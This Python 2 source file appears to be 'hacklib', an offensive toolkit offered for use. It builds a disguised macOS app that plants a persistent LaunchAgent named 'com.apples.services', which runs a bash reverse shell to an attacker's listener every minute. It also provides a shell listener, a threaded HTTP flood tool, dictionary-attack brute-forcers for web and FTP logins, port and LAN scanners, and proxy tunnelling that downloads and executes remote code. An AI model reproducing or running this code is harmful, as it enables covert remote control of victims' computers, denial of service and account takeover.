'''The MIT License (MIT)

Copyright (c) 2016 Leon Li (leon@apolyse.com)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
associated documentation files (the "Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial
portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.'''

import socket, httplib, threading, time, urllib2, os
from Queue import Queue
try: # Import scapy if they have it. If they don't, they can still use hacklib
    from scapy.all import *
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Fixes scapy logging error
except: pass
from string import ascii_uppercase, ascii_lowercase, digits # Import for PatternCreate and PatternOffset

class Backdoor(object):
    '''Creates an app carrying a persistent backdoor payload. Currently only for Mac OSX.
        Payloads for Windows and Linux coming soon.'''

    def __init__(self):
        self.IP = ''
        self.port = ''
        self.osx_payload = '''#!/bin/bash
mkdir ~/Library/.h
echo '#!/bin/bash
bash -i >& /dev/tcp/HOST/PORT 0>&1
wait' > ~/Library/.h/connect.sh
chmod +x ~/Library/.h/connect.sh
echo '<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apples.services</string>
<key>ProgramArguments</key>
<array>
<string>/bin/sh</string>
<string>'$HOME'/Library/.h/connect.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
<key>StartInterval</key>
<integer>60</integer>
<key>AbandonProcessGroup</key>
<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.apples.services.plist
chmod 600 ~/Library/LaunchAgents/com.apples.services.plist
launchctl load ~/Library/LaunchAgents/com.apples.services.plist
exit
'''

    def create(self, IP, port, OS, appname = 'funny_cats'):
        '''Creates a user-level reverse shell.'''
        
        if OS == 'OSX':
            self.osx_payload = self.osx_payload.replace('HOST', IP).replace('PORT', str(port))
            try:
                os.makedirs(os.getcwd() + '/' + appname + '.app/Contents/MacOS')
            except: pass
            payload_path = os.getcwd() + '/' + appname + '.app/Contents/MacOS/' + appname
            with open(payload_path, 'w') as f:
                f.write(self.osx_payload)
            import subprocess
            subprocess.Popen(['chmod', '755', payload_path])
            print 'Payload saved to ' + os.getcwd() + '/' + appname + '.app'

class Server(object):

    def __init__(self, port):
        import socket
        self.port = port
        self.address = ('', port)

    def listen(self):
        import time
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(self.address)
        sock.listen(1)
        while True:
            connection, cAddress = sock.accept()
            try:
                print 'New connection', cAddress
                while True:
                    data = connection.recv(32768)
                    if data:
                        print '\n'.join(data.split('\n')[:-1])
                        response = raw_input('bash$ ')
                        data = None
                    if response:
                        connection.sendall(response + '\n')
                        time.sleep(0.5)
            finally:
                connection.close()
                
class FTPAuth(object):
    '''FTP login and command handler.
    Commands:
                    login() Args: username, password
                    send() Args: message
    '''

    def __init__(self, IP, port=21):
        self.IP = IP
        self.port = port
        self.username = ''
        self.password = ''
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.settimeout(5)
        self.s.connect((self.IP, self.port))
        self.s.recv(1024)

    def _send(self, message):
        self.s.send(message)
        response = self.s.recv(32768)
        return response

    def send(self, message):
        self.s.send(message + '\r\n')
        while True:
            response = self.s.recv(32768)
            if response:
                return response

    def login(self, username, password):
        self._send('USER ' + username + '\r\n')
        response = self._send('PASS ' + password + '\r\n')
        if '230' in response:
            return
        elif '331' in response:
            return 'Password required'
        else:
            raise Exception(response)
        
class AuthClient(object):
    '''Universal login tool for most login pages as well as HTTP Basic Authentication.
    Commands:
                    login() Args: url, username, password
    '''

    def __init__(self):
        self.url = ''
        self.username = ''
        self.password = ''

    def _get_login_type(self):
        try:
            # Attempts to urlopen target URL without exception
            data = urllib2.urlopen(self.url)
            return 'FORM'
        except Exception, e:
            if 'error 401' in str(e).lower():
                return 'BA'
            if 'timed out' in str(e).lower():
                return 'TO'
            
    def _login_mechanize(self):
        try:
            import mechanize
        except:
            raise MissingPackageException('Please install the mechanize module before continuing.')
        # Sets up common input names/ids and creates instance of mechanize.Browser()
        userfields = ['user', 'username', 'usr', 'email', 'name', 'login', 'userid', 'userid-input', 'player']
        passfields = ['pass', 'password', 'passwd', 'pw', 'pwd']
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_refresh(False)
        br.addheaders = [('User-agent', 'googlebot')]
        # Opens URL and lists controls
        response = br.open(self.url)
        loginurl = response.geturl()
        br.form = list(br.forms())[0]
        username_control = ''
        password_control = ''
        # Locates username and password input, and submits login info
        for control in br.form.controls:
            if control.name and control.name.lower() in userfields or control.id and control.id.lower() in userfields: username_control = control
            if control.name and control.name.lower() in passfields or control.id and control.id.lower() in passfields: password_control = control
        username_control.value = self.username
        try: password_control.value = self.password
        except:
            # Detected a username input but not a password input.
            # Submits form with username and attempts to detect password input in resulting page
            response = br.submit()
            br.form = list(br.forms())[0]
            for control in br.form.controls:
                if control.name and control.name.lower() in passfields or control.id and control.id.lower() in passfields: password_control = control
        password_control.value = self.password
        response = br.submit()
        # Returns response if the URL is changed. Assumes login failure if URL is the same
        if response.geturl() != loginurl:
            return response.read()
        else:
            raise Exception('Login credentials incorrect.')

    def _login_BA(self):
        try:
            # Creates a PasswordMgr instance
            passmanager = urllib2.HTTPPasswordMgrWithDefaultRealm()
            passmanager.add_password(None, self.url, self.username, self.password)
            # Creates an auth handling object and builds it with opener
            auth = urllib2.HTTPBasicAuthHandler(passmanager)
            opener = urllib2.build_opener(auth)
            response = opener.open(self.url, timeout=8)
            data = response.read()
            response.close()
            return data
        except Exception, e:
            if 'Error 401' in str(e):
                raise Exception('Login credentials incorrect.')
            
    def login(self, url, username, password):
        self.url = url
        self.username = username
        self.password = password
        # ascertain the type of login page given by url
        logintype = self. _get_login_type()
        if logintype == 'BA':
            # attempts to login with BA method and return html
           return self._login_BA()
        if logintype == 'TO':
            raise Exception('Request timed out.')
        if logintype == 'FORM':
            return self._login_mechanize()

class DOSer(object):
    '''Hits a host with GET requests on default port 80 from multiple threads.
    Commands:
                    launch() Args: host, duration, threads(default 1), port(default 80),
                    payload(default crocodile)
    '''

    def __init__(self):
        self.target = '127.0.0.1'
        self.port = 80
        self.threads = 1
        self.payload = '?INTERIORCROCODILEALLIGATORIDRIVEACHEVROLETMOVIETHEATER'
        self.start_time = 0
        self.time_length = 1

    def _attack(self, target):  
        # Sends GET requests for time_length duration
        while int(time.time()) < self.start_time + self.time_length:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            try:
                s.connect((self.target, self.port))
                s.send("GET /" + self.payload + " HTTP/1.1\r\n")  
                s.send("Host: " + self.target  + "\r\n\r\n")
            except: pass

    def _threader(self):
        while True:
            self.worker = self.q.get()
            self._attack(self.worker)
            self.q.task_done()

    def launch(self, host, duration, threads = 1, port = 80, payload = 'default'):
        '''Launches threaded GET requests for (duration) seconds.
        '''
        self.target = host
        self.port = port
        self.threads = threads
        self.start_time = int(time.time())
        self.time_length = duration
        if payload != 'default': self.payload = payload
        # Creates queue to hold each thread
        self.q = Queue.Queue()
        #print '> Launching ' + str(threads) + ' threads for ' + str(duration) + ' seconds.'
        for i in range(threads):
            t = threading.Thread(target=self._threader)
            t.daemon = True
            t.start()
        # Adds workers to queue
        for worker in range(0, threads):
            self.q.put(worker)

        self.q.join()
        return

class PortScanner(object):
    '''Scan an IP address using scan(host) with default port range 1-1024.
    Commands:
                    scan() Args: IP, port_range(default 1024), timeout(default 1), verbose(default True)
    '''

    def __init__(self):
        self.IP = '127.0.0.1'
        self.port_range = '1025'
        self.print_lock = threading.Lock()
        self.timeout = 2
        self.openlist = []
        self.verbose = True

    def _portscan(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        # Tries to establish a connection to port, and append to list of open ports
        try:
            con = s.connect((self.IP,port))
            response = s.recv(1024)
            self.openlist.append(port)
            if self.verbose:
                with self.print_lock:
                    print 'Port', str(port) + ':'
                    print response
            s.close()
        # If the connection fails, tries to establish HTTP connection if port is a common HTTP port
        except Exception, e:
            httplist = [80, 81, 443, 1900, 2082, 2083, 8080, 8443]
            if port in httplist:
                try:
                    headers = '''GET /HTTP/1.1
Host: ''' + self.IP + '''
User-Agent: googlebot
Accept: text/html, application/xhtml+xml, application/xml; q=09, */*; q=0.8
Accept-Language: en-US, en; q=0.5
Accept-Encoding: gzip, deflate''' + '\r\n\r\n'
                    s.send(headers)
                    response = s.recv(1024)
                    response = response.splitlines()
                    response = '\n'.join(response[:7])
                    self.openlist.append(port)
                    if self.verbose:
                        with self.print_lock:
                            print 'Port', str(port) + ':'
                            print response
                    s.close()
                except: pass
                
    def portOpen(self, port):
        if port in self.openlist:
            return
        else:
            return False
        
    def _threader(self):
        while True:
            self.worker = self.q.get()
            self._portscan(self.worker)
            self.q.task_done()

    def scan(self, IP, port_range = (1, 1025), timeout = 1, verbose = True):
        '''Scans ports of an IP address. Use getIP() to find IP address of host.
        '''
        self.openlist = []
        self.IP = IP
        self.port_range = port_range
        self.timeout = 1
        # Creates queue to hold each thread
        self.q = Queue.Queue()
        for x in range(30):
            t = threading.Thread(target=self._threader)
            t.daemon = True
            t.start()
        # Adds workers to queue
        for worker in range(port_range[0], port_range[1]):
            self.q.put(worker)

        self.q.join()

class LanScanner(object):
    '''Scans local devices on your LAN network.
    Commands:
                    scan() Args: host_range(default (1, 255))
    '''

    def __init__(self):
        self.host_range = []
        self.alive_hosts = []
        self.localIP = ''

    def _threader(self):
        while True:
            self.worker = self.q.get()
            self._scan(self.worker)
            self.q.task_done()

    def _scan(self, host):
        import subprocess
        try:
            resp = subprocess.check_output(['ping', '-c1', '-W90', host])
            self.alive_hosts.append(host)
        except: return

    def getLocalIP(self):
        import subprocess
        proc = subprocess.Popen(["ifconfig"], stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()
        data = out.splitlines()
        for line in data:
            if 'inet ' in line and '127.' not in line:
                return line.split(' ')[1]
        
    def scan(self, h_range = (1, 255)):
        # Finds local IP first in order to determine IP range of local network
        localip = self.getLocalIP()
        stub = '.'.join(localip.split('.')[:-1])
        # Adds list of possible local hosts to self.range_range
        for i in range(h_range[0], h_range[1]):
            self.host_range.append(stub + '.' + str(i))
        self.q = Queue.Queue()
        # Launches 100 threads to ping 254 potential hosts
        for x in range(100):
            t = threading.Thread(target=self._threader)
            t.daemon = True
            t.start()
        for worker in self.host_range:
            self.q.put(worker)
        self.q.join()
        return list(set(self.alive_hosts))
    
class _Getch:
    """Gets a single character from standard input.  Does not echo to the
    screen."""
    def __init__(self):
        try:
            self.impl = _GetchWindows()
        except ImportError:
            try:
                self.impl = _GetchUnix()
            except ImportError:
                self.impl = _GetchMacCarbon()

    def __call__(self): return self.impl()


class _GetchUnix:
    def __init__(self):
        import tty, sys, termios

    def __call__(self):
        import sys, tty, termios
        try:
            fd = sys.stdin.fileno()
            old_settings = termios.tcgetattr(fd)
            try:
                tty.setraw(sys.stdin.fileno())
                ch = sys.stdin.read(1)
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            return ch
        except: return raw_input('> ')

class _GetchWindows:
    def __init__(self):
        import msvcrt

    def __call__(self):
        try:
            import msvcrt
            return msvcrt.getch()
        except: return raw_input('> ')

class Proxy(object):
    '''Can work in conjunction with getProxies() to tunnel all
    network activity in the Python script through a Socks4/5 proxy.
    Commands:
                    connect() Args: getProxies(), timeout=10
                    connect_manual() Args: IP, port, proxy_type
    '''
    
    def __init__(self):
        self.IP = ''
        self.port = ''
        self.proxy_type = ''
        self.country = ''
        self._socksfile = urllib2.urlopen('https://raw.githubusercontent.com/Anorov/PySocks/master/socks.py').read()
        global socks
        # Dynamically import socks.py from the internet
        socks = importFromString(self._socksfile, 'socks')

    def connect(self, proxies, timeout=10):
        for proxy in proxies:
            if proxy[4] == 'Socks4':
                self.proxy_type = socks.PROXY_TYPE_SOCKS4
            else:
                self.proxy_type = socks.PROXY_TYPE_SOCKS5
            try:
                # Sets the socket.socket class to the socks module's socksocket class
                socks.setdefaultproxy(self.proxy_type, proxy[0], int(proxy[1]))
                socket.socket = socks.socksocket
                # Tests to see if the proxy can open a webpage
                currentIP = urllib2.urlopen('http://icanhazip.com/', timeout = timeout).read().split()[0]
                self.IP = proxy[0]
                self.port = int(proxy[1])
                self.country = proxy[2]
                return
            except: pass
        raise Exception('Couldn\'t connect to any proxies.')

    def connect_manual(IP, port, proxy_type='Socks5'):
        if proxy_type == 'Socks4':
            self.proxy_type = socks.PROXY_TYPE_SOCKS4
        else:
            self.proxy_type = socks.PROXY_TYPE_SOCKS5
        try:
            socks.setdefaultproxy(self.proxy_type, IP, port)
            socket.socket = socks.socksocket
            currentIP = urllib2.urlopen('http://icanhazip.com/').read().split()[0]
            self.IP = IP
            self.port = port
            return currentIP
        except: raise Exception('Connection failed.')


def importFromString(code, name):
    """Import dynamically generated code as a module.
    Args: code: a string, a file handle, or a compiled binary
    name: the name of the module
    """
    import sys, imp
    module = imp.new_module(name)
    exec code in module.__dict__
    return module

def getIP(host):
    return socket.gethostbyname(host)

def randomIP():
    import struct
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

def getProxies(country_filter = 'ALL', proxy_type = ('Socks4', 'Socks5')):
    '''Gets list of recently tested Socks4/5 proxies.
    Return format is as follows:
    [IP, Port, Country Code, Country, Proxy Type, Anonymous, Yes/No, Last Checked]
    Args: country_filter: Specify country codes within a tuple, e.g. ('US', 'MX')
    proxy_type: Specify whic Socks version to use, e.g. 'Socks5'
    '''
    try: import mechanize
    except: raise MissingPackageException('Please install the mechanize module before continuing. Use hacklib.installDependencies()')
    try: from bs4 import BeautifulSoup
    except: raise MissingPackageException('Please install the beautifulsoup4 module before continuing. Use hacklib.installDependencies()')
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.addheaders = [('User-agent', 'googlebot')]
    data = br.open('http://www.socks-proxy.net').read()
    soup = BeautifulSoup(data, 'html.parser')
    proxylist = []
    table = soup.find('table')
    tbody = table.find('tbody')
    rows = tbody.find_all('tr')
    for row in rows:
        cols = row.find_all('td')
        cols = [ele.text.strip() for ele in cols]
        proxylist.append([ele for ele in cols if ele])
    filteredlist = []
    if not country_filter == 'ALL':
        for proxy in proxylist:
            if proxy[2] in country_filter:
                filteredlist.append(proxy)
        proxylist = filteredlist
        filteredlist = []
    if not proxy_type == ('Socks4', 'Socks5'):
        for proxy in proxylist:
            if not country_filter == 'ALL':
                if proxy[4] in proxy_type and proxy[2] in country_filter:
                    filteredlist.append(proxy)
            else:
                if proxy[4] in proxy_type: filteredlist.append(proxy)
        proxylist = filteredlist
    return proxylist

def installDependencies():
    import subprocess
    mech = subprocess.check_output(['/usr/local/bin/pip', 'install', 'mechanize'])
    if 'successfully installed' in mech: print 'Installed mechanize'
    beaut = subprocess.check_output(['/usr/local/bin/pip', 'install', 'bs4'])
    if 'successfully installed' in beaut: print 'Installed beautifulsoup'
    scapy = subprocess.check_output(['/usr/local/bin/pip', 'install', 'scapy'])
    if 'successfully installed' in scapy: print 'Installed scapy'
    pcapy = subprocess.check_output(['/usr/local/bin/pip', 'install', 'pcapy'])
    if 'successfully installed' in pcapy: print 'Installed pcapy'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def send(IP, port, message, keepalive = False):
    '''Creates new socket and sends a TCP message. If keepalive is true, use hacklib.sock
    to handle socket and hacklib.sock.close() when finished.
    '''
    if keepalive:
        global sock
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP, port))
    sock.send(message)
    response = sock.recv(2048)
    if not keepalive:
        sock.close()
    return response

def ping(host):
    """Pings a host and returns true if the host exists.
    """
    import os, platform
    ping_str = "-n 1" if  platform.system().lower()=="windows" else "-c 1"
    return os.system("ping " + ping_str + " " + host) == 0

def topPasswords(amount):
    '''Get up to 100,000 most common passwords.
    '''
    url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_100000.txt'
    passlist = urllib2.urlopen(url).read().split('\n')
    return passlist[:amount]

def uiPortScan(address):
    print ''
    print '1) default scan (port range 1-1024)'
    print '2) custom range'
    ink = _Getch()
    cmd = ink()
    ps = PortScanner()
    print 'Beginning port scan.'
    if cmd == '1':
        ps.scan(address)
    if cmd == '2':
        s_port = raw_input('Input starting port > ')
        e_port = raw_input('Input end port >')
        ps.scan(address, (int(s_port), int(e_port)))
    print 'Port scan complete.'

def uiDOS(address):
    dos = DOSer()
    print ''
    duration = raw_input('Duration > ')
    threads = raw_input('Threads > ')
    port = int(raw_input('Port > '))
    payload = raw_input('Payload > ')
    print 'Launching DOS attack'
    dos.launch(address, duration, threads, port, payload)

def uiTCPMessage(address):
    print ''
    port = int(raw_input('Input port >'))
    message = raw_input('Message > ')
    send(address, port, message)

def uiLogin(address):
    print ''
    print 'Select login type'
    print '1) HTTP/Form login'
    print '2) FTP login'
    print '3) Exit'
    print ''
    ink = _Getch()
    cmd = ink()
    if cmd == '1':
        ac = AuthClient()
        print '1) Dictionary attack'
        print '2) Exit'
        ink = _Getch()
        cmd = ink()
        if cmd == '1':
            username = raw_input('Username > ')
            print '1) Try most common passwords'
            print '2) Import password list (separated by newline)'
            cmd = ink()
            if cmd == '1':
                print 'Try the top <input number> out of 100,000 most common passwords:'
                num = int(raw_input('> '))
                passwords = topPasswords(num)
            if cmd == '2':
                passfile = raw_input('Filepath > ')
                with open(passfile, 'r') as f:
                    passwords = passfile.read().splitlines()
            print 'Input a unique string the webpage may respond with if login fails'
            print 'i.e. "please try again" or "login failed"'
            failstring = raw_input('> ')
            for password in passwords:
                try:
                    data = ac.login(address, username, password)
                    if failstring in data:
                        print password + ' failed'
                    elif failstring not in data:
                        print 'Login success!'
                        print 'Password is: ' + password
                        time.sleep(2)
                        return
                except:
                    print password + ' failed'
        if cmd == '2':
            return

    if cmd == '2':
        ftp = FTPAuth(address)
        print '1) Dictionary attack'
        print '2) Single login'
        print '3) Exit'
        ink = _Getch()
        cmd = ink()
        username = raw_input('Username > ')
        if cmd == '1':
            print 'Try the top <input number> out of 100,000 most common passwords:'
            num = raw_input('> ')
            for password in topPasswords(num):
                try:
                    response = ftp.send('USER ' + username + '\r\n')
                    if '331' in response:
                        response = ftp.send('PASS ' + password + '\r\n')
                        if '331' in response:
                            response = ftp.send('PASS ' + password + '\r\n')
                    if '230' in response:
                        print 'Login success!'
                        print 'Password is: ' + password
                        time.sleep(2)
                        return
                    if '530' in response:
                        print password + ' failed.'
                        ftp = FTPAuth(address)
                except:
                    print password + ' failed.'
                    ftp = FTPAuth(address)
                    
        if cmd == '2':
            username = raw_input('Username > ')
            ftp.send('USER ' + username + '\r\n')
            password = raw_input('Password > ')
            ftp.send('PASS ' + password + '\r\n')
        if cmd == '3':
            return

def uiLanScan():
    lan = LanScanner()
    print 'Starting Lan scan'
    hosts = lan.scan()
    for ip in hosts:
        print ip
    print 'Lan scan complete.'
    time.sleep(2)

def uiCreateBackdoor():
    print ''
    print 'Select OS'
    print '1) Mac OSX'
    ink = _Getch()
    cmd = ink()
    if cmd == '1':
        ip = raw_input('Listener IP > ')
        port = raw_input('Listener Port > ')
        appname = raw_input('Filename > ')
        bd = Backdoor()
        bd.create(ip, port, 'OSX', appname)
        time.sleep(2)

def uiServer():
    print ''
    port = raw_input('Listening port > ')
    s = Server(int(port))
    print 'Listening on port ' + port
    s.listen()
    
def userInterface():
    '''Start UI if hacklib isn't being used as a library.
    '''
    firstrun = 0
    while True:
        if firstrun == 0:
            print '----------------------------------------------'
            print 'Hey. What can I do you for?'
            print '\n'
            firstrun += 1
        print 'Enter the number corresponding to your choice.'
        print ''
        print '1) Connect to a proxy'
        print '2) Target an IP or URL'
        print '3) Lan Scan'
        print '4) Create Backdoor'
        print '5) Server'
        print '6) Exit'
        ink = _Getch()
        cmd = ink()
        if cmd == '6':
            return
        if cmd == '2':
            address = raw_input('Input IP or URL > ')
            if '.' not in address:
                print 'Invalid IP/URL.'
                return
            print 'What would you like to do?'
            print ''
            print '1) Port scan'
            print '2) DOS'
            print '3) Send TCP message'
            print '4) Attempt login'
            print '5) Exit'
            cmd = ink()
            if cmd == '1': uiPortScan(getIP(address))
            if cmd == '2': uiDOS(getIP(address))
            if cmd == '3': uiTCPMessage(getIP(address))
            if cmd == '4': uiLogin(address)
            cmd = ''

        if cmd == '3':
            uiLanScan()

        if cmd == '4':
            uiCreateBackdoor()

        if cmd == '5':
            uiServer()
            
        if cmd == '1':
            print 'Would you like to automatically find a proxy or input one manually?'
            print 'Enter the number corresponding to your choice.'
            print ''
            print '1) Auto'
            print '2) Manual'
            cmd = ink()
            print 'Connecting to a SOCKS proxy.'
            proxies = getProxies()
            global proxy
            proxy = Proxy()
            if cmd == '1':
                proxy.connect(getProxies())
                print 'Your new IP address is ' + proxy.IP
                print 'This proxy is located in ' + proxy.country
                print '---------'
                time.sleep(2)
            if cmd == '2':
                pr_address = raw_input('Proxy address > ')
                pr_port = raw_input('Proxy port > ')
                pr_type = raw_input('Enter "Socks4" or "Socks5" > ')
                try: proxy.connect_manual(pr_address, pr_port, pr_type)
                except: print 'Connection failed.'; time.sleep(2); pass
                print 'Proxy connected.'
                time.sleep(2)
                pass
"""

This Class Mangles Words specified by the user

Example:

Test = hacklib.Mangle("Test", 1, 10, 1996, 2016)

Test.Leet()

Output: T3st

"""

class Mangle:

    def __init__(self, text, num1, num2, year1, year2):

        self.num1 = num1
        self.num2 = num2
        self.year1 = year1
        self.year2 = year2
        self.text = text


    def Numbers(self):

        for x in self.text.split():

            for i in range(self.num1, self.num2):
                
                print ("%s" + "%s") % (x, i)
                print ("%s" + "%s") % (i, x)

    def Years(self):

        for x in self.text.split():

            for i in range(self.year1, self.year2):
                
                print ("%s" + "%s") % (x, i)
                print ("%s" + "%s") % (i, x)


    def UniqueNum(self):
        
        for x in self.text.split():
              
            for i in range(self.num1, self.num2):

                print ("%s" + "%s" + "%s") % (x, x, i)


    def UniqueYears(self):

        for x in self.text.split():
              
            for i in range(self.year1, self.year2):

                print ("%s" + "%s" + "%s") % (x, x, i)



    def FirstLetterCapNum(self):

        for x in self.text.split():

            for i in range(self.num1, self.num2):
                
                print ("%s" + "%s") % (x.capitalize(), i)
                print ("%s" + "%s") % (i, x.capitalize())

    def Caps(self):

        for x in self.text.split():

            print x.capitalize()


    def UniqueCaps(self):

        for x in self.text.split():

            print ("%s" + "s") % (x.capitalize(), x.capitalize())
        


    def CapandYears(self):

        for x in self.text.split():

            for i in range(self.year1, self.year2):
                
                print ("%s" + "%s") % (x.capitalize(), i)
                print ("%s" + "%s") % (i, x.capitalize())
            
        
    def Leet(self):

        for x in self.text.split():
            print x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8")



    def LeetCap(self):

        for x in self.text.split():
            print x.capitalize().replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8")



    def LeetYears(self):

        for x in self.text.split():

            for i in range(self.year1, self.year2):

                print ("%s" + "%s") % (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"), i)
                print ("%s" + "%s") % (i, x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"))


    def LeetNumbers(self):

        for x in self.text.split():

            for i in range(self.num1, self.num2):

                print ("%s" + "%s") % (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"), i)
                print ("%s" + "%s") % (i, x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"))


    def UniqueLeet(self):

        for x in self.text.split():

            print ("%s" + "%s") % (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"),(x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8")))



    def Reverse(self):

        for x in self.text.split():

            print x[::-1]


    def ReverseCap(self):

        for x in self.text.split():
            print x[::-1].capitalize()



    def ReverseNum(self):

        for x in self.text.split():

            for i in range(self.num1, self.num2):

                print ("%s" + "%s") % (x[::-1], i)
                print ("%s" + "%s") % (i, x[::-1])



    def ReverseYears(self):

        for x in self.text.split():

            for i in range(self.year1, self.year2):

                print ("%s" + "%s") % (x[::-1], i)
                print ("%s" + "%s") % (i, x[::-1])


    def ReverseUnique(self):

        for x in self.text.split():

            print x[::-1] + x[::-1]

'''
This Classes Dectects Probe Requests from Wireless Devices.

Example: 

Probe = Proberequests("wlan0")

Probe.startSniff()

'''

class Proberequests:

    global probeReqs

    probeReqs = []

    def __init__(self, interface):

        self.interface = interface

    def sniffProbe(self, p):

        if p.haslayer(Dot11ProbeReq):
            netName = p.getlayer(Dot11ProbeReq).info
            if netName not in probeReqs:
                probeReqs.append(netName)
                print '[!] Detected New Probe Request: '
                print "[+] ESSID: " + netName + " BSSID: " + p.addr2

    def startSniff(self):

        print "[+] Scanning...\n"

        sniff(iface=self.interface, prn=self.sniffProbe)

"""

This class creates a unique pattern of 20280 characters. 

This is a replica of the metasploit tool called pattern_create.rb

Example:

patternTest = PatternCreate(1000)

patternTest.generate()

Creates a unique pattern of 1000 characters.

"""

class PatternCreate:

    global MAX_PATTERN_LENGTH 

    MAX_PATTERN_LENGTH = 20280

    def __init__(self, length):

        self.length = length

    def generate(self):

        output = []

        """
        Generate a pattern of a given length up to a maximum
        of 20280 - after this the pattern would repeat
        """
        if self.length >= MAX_PATTERN_LENGTH:
            raise MaxLengthException('ERROR: Pattern length exceeds maximum of %d' % MAX_PATTERN_LENGTH)

        pattern = ''
        for upper in ascii_uppercase:
            for lower in ascii_lowercase:
                for digit in digits:
                    if len(pattern) < self.length:
                        pattern += upper+lower+digit
                    else:
                        out = pattern[:self.length]

        output.append(out)

        print str(output)[1:-1].replace("'", "")


"""

This class finds the offset from the PatternCreate class.

This is a replica of the metasploit tool called pattern_offset.rb

Example:

offset = PatternOffset("Aw1A")

offset.find()

Finds offset of Aw1A.

Output: [+] Offset: 663

"""

class PatternOffset:

    def __init__(self, search_pattern):
        


        self.search_pattern = search_pattern

    def find(self):

        offset = []

        needle = self.search_pattern

        try:
            if needle.startswith('0x'):
                # Strip off '0x', convert to ASCII and reverse
                needle = needle[2:]
                needle = bytes.fromhex(needle).decode('ascii')
                needle = needle[::-1]
        except TypeError as e:
            print('Unable to convert hex input:', e)
            sys.exit(1)

        haystack = ''
        for upper in ascii_uppercase:
            for lower in ascii_lowercase:
                for digit in digits:
                    haystack += upper+lower+digit
                    found_at = haystack.find(needle)
                    if found_at > -1:

                        offset = found_at

        print "[+] Offset: " + str(offset)

if __name__ == '__main__':
    userInterface()

class MissingPackageException(Exception):
    '''Raise when 3rd party modules are not able to be imported.'''

class MissingPipexception(Exception):
    '''Raise when pip is not able to be found'''
